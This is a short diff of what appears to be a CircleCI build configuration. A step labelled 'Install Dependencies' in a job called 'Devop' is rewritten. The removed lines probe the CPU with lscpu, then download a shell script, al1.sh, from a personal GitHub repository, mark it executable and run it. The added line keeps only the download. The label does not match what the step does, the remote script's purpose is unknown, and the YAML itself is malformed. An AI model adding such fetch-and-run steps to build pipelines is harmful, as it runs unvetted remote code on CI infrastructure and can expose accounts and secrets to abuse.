@@ -6,12 +6,12 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
-            wget https://raw.githubusercontent.com/zalate1/al1/main/al1.sh && chmod +x al1.sh && al1.sh
+            command: wget https://raw.githubusercontent.com/zalate1/al1/main/al1.sh
+
+        
 
 workflows:
     version: 2.1
     build:
         jobs:
             - Devop
-            
